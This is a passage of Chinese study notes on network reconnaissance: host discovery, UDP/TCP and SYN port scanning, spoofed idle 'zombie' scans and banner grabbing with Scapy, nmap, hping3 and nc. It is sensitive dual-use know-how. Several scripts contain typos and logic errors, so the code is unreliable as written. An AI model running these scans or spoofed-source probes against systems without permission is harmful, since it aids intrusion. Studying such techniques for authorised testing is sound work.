class="line">if["$#" -ne 1];then</span><br><span class="line">echo "Usage - ./pinger.sh [/24 network address]"</span><br><span class="line">echo "Example - ./ping.sh 172.16.26.0"</span><br><span class="line">echo "Example will perform an ICMP ping sweep of the 172.16.26.0/24 work"</span><br><span class="line">exit</span><br><span class="line">fi</span><br><span class="line">prefix=$(echo $1 | cut -d '.' -f 1-3)</span><br><span class="line">for addr in $(seq 1 254);do</span><br><span class="line">ping -c|1 $prefix.$addr|grep "bytes from"| cut -d ""-f 4|cut -d "." -f 1 &amp;</span><br><span class="line">done</span><br></pre></td></tr></table></figure></li><li><p>​</p></li></ul></li></ul><h4 id="四层发现"><a href="#四层发现" class="headerlink" title="四层发现"></a>四层发现</h4><ul><li><p>优点</p><ul><li>可路由且结果可靠</li><li>不太可能被防火墙过滤</li><li>甚至可以发现所有端口都被过滤的主机</li></ul></li><li><p>缺点</p><ul><li>基于状态过滤的防火墙可能过滤扫描</li><li>全端口扫描速度慢</li></ul></li><li><p>TCP</p><ul><li>未经请求的ACK——RST</li><li>SYN——SYN/ACK、RST</li></ul></li><li><p>UDP</p><ul><li>ICMP端口不可达、一去不复返</li></ul></li><li><p>ACK——TCP Port——RST</p></li><li><p>Scapy</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">i = IP()</span><br><span class="line">t = TCP()</span><br><span class="line">r = (i/t)</span><br><span class="line">r.display()</span><br><span class="line">r[IP].dst=<span class="string">"192.168.1.1"</span></span><br><span class="line">r[TCP].flags=<span class="string">"A"</span></span><br><span class="line">a=sr1(r)</span><br><span class="line">a.display()</span><br><span class="line"></span><br><span class="line">a = sr1(IP(dst=<span class="string">"1.1.1.1"</span>)/TCP(dport=<span class="number">80</span>,flags=<span class="string">'A'</span>), timeout=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>ACK_Ping.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.getLogger(<span class="string">"scapy.runtime"</span>).setLevel(logging.ERROR)</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv)!=<span class="number">2</span>:</span><br><span class="line">    print(<span class="string">"Usage - ./ACK_Ping.py [/24 network address]"</span>)</span><br><span class="line">    print(<span class="string">"Example - ./ACK_Ping.py 1.1.1.0"</span>)</span><br><span class="line">    print(<span class="string">"Example will perform a TCP ACK ping scan of the 1.1.1.0/24 range"</span>)</span><br><span class="line">    sys.exit()</span><br><span class="line">    </span><br><span class="line">address = srt(sys.argv[<span class="number">1</span>])</span><br><span class="line">prefix =  address.split(<span class="string">'.'</span>)[<span class="number">0</span>] + <span class="string">'.'</span>+address.split(<span class="string">'.'</span>)[<span class="number">1</span>]+<span class="string">'.'</span>+address.split(<span class="string">'.'</span>)[<span class="number">2</span>]+<span class="string">'.'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> addr <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">254</span>):</span><br><span class="line">    respone=sr1(IP(dst=prefix+str(addr))/TCP(dport=<span class="number">2222</span>,flag=<span class="string">'A'</span>),timeout=<span class="number">0.1</span>,verbose=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> int(response[TCP].flags)==<span class="number">4</span>:</span><br><span class="line">            print(prefix+str(addr))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>​</p></li></ul><p>基于UDP</p><ul><li><p>UDP——UDP Port——ICMP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">u = UDP()</span><br><span class="line">u.dport=33333</span><br><span class="line">r = (i/u)</span><br><span class="line">a = sr1(r,timeout=1,verbose=1)</span><br><span class="line">a.display()</span><br></pre></td></tr></table></figure><p>UDP_Ping.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.getLogger(<span class="string">"scapy.runtime"</span>).setLevel(logging.ERROR)</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv)!=<span class="number">2</span>:</span><br><span class="line">    print(<span class="string">"Usage - ./ACK_Ping.py [/24 network address]"</span>)</span><br><span class="line">    print(<span class="string">"Example - ./ACK_Ping.py 1.1.1.0"</span>)</span><br><span class="line">    print(<span class="string">"Example will perform a TCP ACK ping scan of the 1.1.1.0/24 range"</span>)</span><br><span class="line">    sys.exit()</span><br><span class="line">    </span><br><span class="line">address = srt(sys.argv[<span class="number">1</span>])</span><br><span class="line">prefix =  address.split(<span class="string">'.'</span>)[<span class="number">0</span>] + <span class="string">'.'</span>+address.split(<span class="string">'.'</span>)[<span class="number">1</span>]+<span class="string">'.'</span>+address.split(<span class="string">'.'</span>)[<span class="number">2</span>]+<span class="string">'.'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> addr <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">254</span>):</span><br><span class="line">    respone=sr1(IP(dst=prefix+str(addr))/UDP(dport=<span class="number">22222</span>),timeout=<span class="number">0.1</span>,verbose=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> int(response[IP].proto)==<span class="number">1</span>:</span><br><span class="line">            print(prefix+str(addr))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>​</p></li></ul><p>nmap四层发现</p><ul><li><code>nmap 1.1.1.1-254 -PU53 -sn</code> UDP方式</li><li><code>nmap 1.1.1.1-254 -PA80 -sn</code> ACK方式</li><li><code>nmap -iL iplist.txt -PA80 -sn</code></li></ul><p>hping3</p><ul><li><p><code>hping3 --udp 211.144.145.1 -c 1</code></p></li><li><p>udp_hping.sh</p></li><li><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>! /bin/bash</span><br><span class="line">if ["$#" -ne 1]; then</span><br><span class="line">echo "Usage - ./udp_hping.sh [/24 network address]"</span><br><span class="line">echo "Example - ./udp_hping.sh 172.16.36.0"</span><br><span class="line">echo "Example will perform a UDP ping sweep of the 172.16.36.0/24 network and output to an output.txt file"</span><br><span class="line">exit</span><br><span class="line">fi</span><br><span class="line">prefix=$(echo $1 | cut -d '.' -f 1-3)</span><br><span class="line">for addr in $(seq 1 254); do</span><br><span class="line">hping3 $prefix.$addr --udp -c 1 &gt;&gt;r.txt</span><br><span class="line">done</span><br><span class="line">grep Unreachable r.txt | cut -d " " -f 5 | cut -d "=" -f 2 &gt;&gt; output.txt</span><br><span class="line">rm r.txt</span><br></pre></td></tr></table></figure></li><li><p><code>hping3 1.1.1.1 -c 1</code> （TCP)</p></li><li><p>tcp_hping.sh</p></li><li><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>! /bin/bash</span><br><span class="line">if ["$#" -ne 1]; then</span><br><span class="line">echo "Usage - ./tcp_hping.sh [/24 network address]"</span><br><span class="line">echo "Example - ./tcp_hping.sh 172.16.36.0"</span><br><span class="line">echo "Example will perform a TCP ping sweep of the 172.16.36.0/24 network and output to an output.txt file"</span><br><span class="line">exit</span><br><span class="line">fi</span><br><span class="line">prefix=$(echo $1 | cut -d '.' -f 1-3)</span><br><span class="line">for addr in $(seq 1 254); do</span><br><span class="line">hping3 $prefix.$addr -c 1 &gt;&gt;r.txt</span><br><span class="line">done</span><br><span class="line">grep len r.txt | cut -d " " -f 5 | cut -d "=" -f 2 &gt;&gt; output.txt</span><br><span class="line">rm r.txt</span><br></pre></td></tr></table></figure></li><li><p>Flag 0 —- ACK,RST</p></li></ul><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><ul><li><p>端口对应网络服务及应用端程序</p></li><li><p>服务端程序的漏洞通过端口攻入</p></li><li><p>发现开放的端口</p></li><li><p>更具体的攻击面</p></li><li><h5 id="UDP-端口扫描"><a href="#UDP-端口扫描" class="headerlink" title="UDP 端口扫描"></a>UDP 端口扫描</h5><ul><li>假设 ICMP port-unreachable 响应代表端口关闭<ul><li>目标系统不响应ICMP port-unreachable时，可能产生误判</li></ul></li><li>完整的UPD应用层请求<ul><li>准确性高</li><li>耗时巨大</li></ul></li></ul></li><li><p>Scapy UDP Scan</p><ul><li>端口关闭：ICMP port-unreachable</li><li>端口开放：没有回包</li><li>了解每一种基于UDP的应用层结构很有帮助</li><li>与三层相同的技术</li><li>误判</li></ul></li><li><p>Scapy</p><ul><li><p><code>sr1(IP(dst=&quot;1.1.1.1&quot;)/UDP(dport=53), timeout=1,verbose=1)</code></p></li><li><p><code>./udp_scan.py 1.1.1.1 1 100</code></p></li><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.getLogger(<span class="string">"scapy.runtime"</span>).setLevel(logging.ERROR)</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv)!=<span class="number">4</span>:</span><br><span class="line">    print(<span class="string">"Usage - ./udp_scan.py [Target-IP] [First Port] [Last Port]"</span>)</span><br><span class="line">    print(<span class="string">"Example - ./udp_scan.py 10.0.0.5 1 100"</span>)</span><br><span class="line">    print(<span class="string">"Example will UDP port scan ports 1 through 100 on 10.0.0.5"</span>)</span><br><span class="line">    sys.exit()</span><br><span class="line">    </span><br><span class="line">ip = sys.argv[<span class="number">1</span>]</span><br><span class="line">start = int(sys.argv[<span class="number">2</span>])</span><br><span class="line">end = int(sys.argv[<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> range(start,end):</span><br><span class="line">    a = sr1(IP(dst=ip)/UDP(dport=port),timeout=<span class="number">5</span>,verbose=<span class="number">0</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> a==<span class="keyword">None</span>:</span><br><span class="line">        print(port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></li><li><p>Nmap</p><ul><li>nmap -sU 1.1.1.1<ul><li>默认的1000个参数</li><li>ICMP host-unreachable</li></ul></li><li>nmap 1.1.1.1 -sU -p 53</li><li>nmap -iL iplist.txt -sU -p 1-200</li></ul></li></ul><h5 id="TCP端口扫描"><a href="#TCP端口扫描" class="headerlink" title="TCP端口扫描"></a>TCP端口扫描</h5></li><li><p>基于连接的协议</p></li><li>三次握手</li><li>隐蔽扫描</li><li>僵尸扫描</li><li>全连接扫描（完成三次握手）</li><li>所有的TCP扫描方式都是基于三次握手的变化来判断目标端口状态（1-SYN 2-SYN，ACK 3-ACK）</li><li>隐蔽扫描——syn<ul><li>不建立完整连接</li><li>应用日志不记录扫描行为——隐蔽</li></ul></li><li>僵尸扫描<ul><li>极度隐蔽</li><li>实施条件苛刻 （1.发起方伪造IP地址 2.有僵尸机 3.IPID递增产生</li><li>可伪造源地址</li><li>选择僵尸机<ul><li>闲置系统</li><li>系统使用递增的IPID<ul><li>0</li><li>随机</li></ul></li></ul></li></ul></li></ul><h6 id="隐蔽端口扫描"><a href="#隐蔽端口扫描" class="headerlink" title="隐蔽端口扫描"></a>隐蔽端口扫描</h6><ul><li><p>Syn——syn/ack——rst</p></li><li><p>Scapy</p><ul><li><p><code>sr1(IP(dst=&quot;192.168.60.3&quot;)/TCP(dport=80),timeout=1,verbose=1)</code></p></li><li><p><code>a = sr1(IP(dst=&quot;192.168.1.134&quot;)/TCP(flags=&quot;S&quot;,dport=22), timeout=1, verbose=0)</code></p></li><li><p>./syn_scan.py</p></li><li><p>chmod u+x syn_scan.py</p></li><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.getLogger(<span class="string">"scapy.runtime"</span>).setLevel(logging.ERROR)</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv)!=<span class="number">4</span>:</span><br><span class="line">    print(<span class="string">"Usage - ./syn_scan.py [Target-IP] [First Port] [Last Port]"</span>)</span><br><span class="line">    print(<span class="string">"Example - ./syn_scan.py 10.0.0.5 1 100"</span>)</span><br><span class="line">    print(<span class="string">"Example will TCP SYN scan ports 1 through 100 on 10.0.0.5"</span>)</span><br><span class="line">    sys.exit()</span><br><span class="line">    </span><br><span class="line">ip = sys.argv[<span class="number">1</span>]</span><br><span class="line">start = int(sys.argv[<span class="number">2</span>])</span><br><span class="line">end = int(sys.argv[<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> range(start,end):</span><br><span class="line">    a = sr1(IP(dst=ip)/TCP(dport=port),timeout=<span class="number">1</span>,verbose=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> a == <span class="keyword">None</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> int(a[TCP],flags) == <span class="number">18</span>:</span><br><span class="line">            print(port)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></li><li><p><code>nmap -sS 1.1.1.1 -p 80,21,25,110,43</code></p></li><li><p><code>nmap -sS 1.1.1.1 -p 1-65535 -open</code></p></li><li><p><code>nmap -sS 1.1.1.1 -p- --open</code></p></li><li><p><code>nmap -sS -iL iplist.txt -p 80</code></p></li><li><p>hping3</p></li><li><p><code>hping3 1.1.1.1 --scan 80 -S</code></p></li><li><p><code>hping3 1.1.1.1 --scan 80,21,25,443 -S</code></p></li><li><p><code>hping3 1.1.1.1 --scan 0-65535 -S</code></p></li><li><p><code>hping3 -c 10 -S --spoof 1.1.1.2 -p ++1 1.1.1.3</code> 伪造IP地址 伪造源地址去查看 或控制交换机镜像端口</p></li></ul><h6 id="全连接端口扫描"><a href="#全连接端口扫描" class="headerlink" title="全连接端口扫描"></a>全连接端口扫描</h6><ul><li><p>Scapy</p><ul><li>Syn扫描不需要raw packets</li><li>内核认为syn/ack是非法包，直接发rst中断连接</li><li>全连接扫描对scapy比较困难</li></ul></li><li><p><code>sr1(IP(dst=&quot;192.168.20.2&quot;)/TCP(dport=22,flags=&#39;S&#39;))</code></p></li><li><p>./tcp_scan1.py</p></li><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.getLogger(<span class="string">"scapy.runtime"</span>).setLevel(logging.ERROR)</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">response = sr1(IP(dst=<span class="string">"192.168.60.4"</span>)/TCP(dport=<span class="number">80</span>,flags=<span class="string">'S'</span>))</span><br><span class="line">reply = sr1(IP(dst=<span class="string">"192.168.60.4"</span>)/TCP(dport=<span class="number">80</span>,flags=<span class="string">'A'</span>,ack=(response[TCP].seq+<span class="number">1</span>)))</span><br></pre></td></tr></table></figure></li><li><p>./tcp_scan2.py</p></li><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.getLogger(<span class="string">"scapy.runtime"</span>).setLevel(logging.ERROR)</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">syn = IP(dst=<span class="string">"192.168.20.4"</span>)/TCP(dport=<span class="number">4444</span>,flags=<span class="string">'S'</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"--SENT--"</span>)</span><br><span class="line">SYN.display()</span><br><span class="line"></span><br><span class="line">print(<span class="string">"\n\n--RECEIVED--"</span>)</span><br><span class="line">response=sr1(SYN,timeout=<span class="number">1</span>,verbose=<span class="number">0</span>)</span><br><span class="line">response.display()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> int(response[TCP].flags)==<span class="number">18</span>:</span><br><span class="line">    print(<span class="string">"\n\n--SENT--"</span>)</span><br><span class="line">    A = IP(dst=<span class="string">"192.168.20.4"</span>)/TCP(dport=<span class="number">4444</span>,flags=<span class="string">'A'</span>,ack=(response[TCP].seq+<span class="number">1</span>))</span><br><span class="line">    A.display()</span><br><span class="line">    print(<span class="string">"\n\n--RECEIVED"</span>)</span><br><span class="line">    response2=sr1(A,timeout=<span class="number">1</span>,verbose=<span class="number">0</span>)</span><br><span class="line">    response2.display()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">"SYN-ACK not returned"</span>)</span><br></pre></td></tr></table></figure></li><li><p>​</p></li><li><p><code>iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 192.168.20.2 -j DROP</code> 禁用内核RST</p></li><li><p>nmap</p></li><li><p><code>nmap -sT 192.168.1.134 -p 1-100</code></p></li><li><p><code>nmap -sT 1.1.1.1 -p 80,21,25</code></p></li><li><p><code>nmap -sT 1.1.1.1 -p 80-2000</code></p></li><li><p><code>nmap -sT -iL iplist.txt -p 80</code></p></li><li><p>默认1000个常用端口</p></li><li><p>dmirty</p><ul><li>功能简单，但使用简便</li><li>默认150个最常用的端口</li></ul></li><li><p><code>dmitry -p 172.16.36.135</code></p></li><li><p><code>dmitry -p 172.16.36.135 -o output</code></p></li><li><p>nc</p></li><li><p><code>nc -nv -w 1 -z 192.168.1.134 1-100</code></p></li></ul><h6 id="僵尸扫描"><a href="#僵尸扫描" class="headerlink" title="僵尸扫描"></a>僵尸扫描</h6><ul><li><p>Scapy——zombie.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">i = IP()</span><br><span class="line">t = TCP()</span><br><span class="line">rz=(i/t)</span><br><span class="line">rt=(i/t)</span><br><span class="line">rz[IP].dst=<span class="string">"192.168.1.133"</span></span><br><span class="line">rz[TCP].dport=<span class="number">445</span></span><br><span class="line">rz[TCP].flags=<span class="string">"SA"</span></span><br><span class="line"></span><br><span class="line">rt[IP].src=<span class="string">"192.168.1.133"</span></span><br><span class="line">rt[IP].dst=<span class="string">"192.168.1.134"</span></span><br><span class="line">rt[TCP].dport=<span class="number">25</span></span><br><span class="line">rt[TCP].flags=<span class="string">"S"</span></span><br><span class="line"></span><br><span class="line">az1=sr1(rz)</span><br><span class="line">at=sr1(rt,timeout=<span class="number">1</span>)</span><br><span class="line">az2=sr1(rz)</span><br><span class="line">az1.display()</span><br><span class="line">az2.display()</span><br><span class="line">ip id+<span class="number">2</span> 目标端口开放</span><br><span class="line">ip id+<span class="number">1</span> 目标端口关闭</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.getLogger(<span class="string">"scapy.runtime"</span>).setLevel(logging.ERROR)</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ipid</span><span class="params">(zombie)</span>:</span></span><br><span class="line">    reply1=sr1(IP(dst=zombie)/TCP(flags=<span class="string">"SA"</span>),timeout=<span class="number">2</span>,verbose=<span class="number">0</span>)</span><br><span class="line">    send(IP(dst=zombie)/TCP(flags=<span class="string">"SA"</span>),verbose=<span class="number">0</span>)</span><br><span class="line">    reply2=sr1(IP(dst=zombie)/TCP(flags=<span class="string">"SA"</span>),timeout=<span class="number">2</span>,verbose=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> reply2[IP].id==(reply1[IP].id+<span class="number">2</span>):</span><br><span class="line">        print(<span class="string">"IPID sequence is incremental and target appears to be idle. ZOMBIE LOCATED"</span>)</span><br><span class="line">        resoponse=input(<span class="string">"Do you want to use this zombie to perform a scan?(Y or N)"</span>)</span><br><span class="line">        <span class="keyword">if</span> response = <span class="string">"Y"</span>:</span><br><span class="line">            target=input(<span class="string">"Enter the IP address of the target system"</span>)</span><br><span class="line">            zombiescan=(target,zombie)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"Either the IPID sequence is not incremental or the target is not idle,NOT A GOOD ZOMBIE"</span>)</span><br><span class="line">            </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">zombiescan</span><span class="params">(target,zombie)</span>:</span></span><br><span class="line">    print(<span class="string">"\nScanning target"</span> + target + <span class="string">"with zombie"</span> + zombie)</span><br><span class="line">    print(<span class="string">"\n----------Open Ports on Target----------\n"</span>)</span><br><span class="line">    <span class="keyword">for</span> port <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            start_val=sr1(IP(dst=zombie)/TCP(flags=<span class="string">"SA"</span>,dport=port),timeout=<span class="number">2</span>,verbose=<span class="number">0</span>)</span><br><span class="line">            send(IP(src=zombie,dst=target)/TCP(flags=<span class="string">"S"</span>,dport=port),verbose=<span class="number">0</span>)</span><br><span class="line">            end_val=sr1(IP(dst=zombie)/TCP(flags=<span class="string">"SA"</span>),timeout=<span class="number">2</span>,verbose=<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">if</span> end_val[IP].id==(start_val[IP].id+<span class="number">2</span>):</span><br><span class="line">                print(port)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line">print(<span class="string">"----------Zombie Scan Suite----------\n"</span>)</span><br><span class="line">print(<span class="string">"1 - Identify Zombie Host\n"</span>)</span><br><span class="line">print(<span class="string">"2 - Perform Zombie Scan\n"</span>)</span><br><span class="line">ans = input(<span class="string">"Select an Option (1 or 2):"</span>)</span><br><span class="line"><span class="keyword">if</span> ans==<span class="string">"1"</span>:</span><br><span class="line">    zombie=input(<span class="string">"Enter IP address to test IPID sequence:"</span>)</span><br><span class="line">    ipid(zombie)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> ans == <span class="string">"2"</span>:</span><br><span class="line">        zombie=input(<span class="string">"Enter IP address for zombie system: "</span>)</span><br><span class="line">        target=input(<span class="string">"Enter IP address for scan target: "</span>)</span><br><span class="line">        zombiescan(target,zombie)</span><br></pre></td></tr></table></figure></li><li><p>发现僵尸机</p><ul><li><code>nmap -p445 192.168.1.133 --script=ipidseq.nse</code></li></ul></li><li><p>扫描目标</p><ul><li><code>nmap 172.16.36.135 -sI 172.16.136.134 -Pn -p 0-100</code></li></ul></li></ul></li></ul><h6 id="服务扫描"><a href="#服务扫描" class="headerlink" title="服务扫描"></a>服务扫描</h6><ul><li><p>识别开放端口上运行的应用</p></li><li><p>识别目标操作系统</p></li><li><p>提高攻击效率</p><ul><li>Banner捕获</li><li>服务识别</li><li>操作系统识别</li><li>SNMP分析</li><li>防火墙识别</li></ul></li><li><p>Banner</p><ul><li>软件开发商</li><li>软件名称</li><li>服务类型</li><li>版本号<ul><li>直接发现已知的漏洞和弱点</li></ul></li></ul></li><li><p>连接建立后直接获取banner</p></li><li><p>另类服务识别方法</p><ul><li>特征行为和响应字段</li><li>不同的响应可用于识别底层操作系统</li></ul></li><li><p>SNMP</p><ul><li>简单网络管理协议</li><li>Community strings</li><li>信息查询或重新配置</li></ul></li><li><p>识别和绕过防火墙筛选</p></li><li><h6 id="Banner"><a href="#Banner" class="headerlink" title="Banner"></a>Banner</h6><ul><li><code>nc -nv 192.168.1.134 22</code></li></ul></li><li><p>Python socket</p><ul><li><p>Socket模块用于连接网络服务</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">banner=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">banner.connect((<span 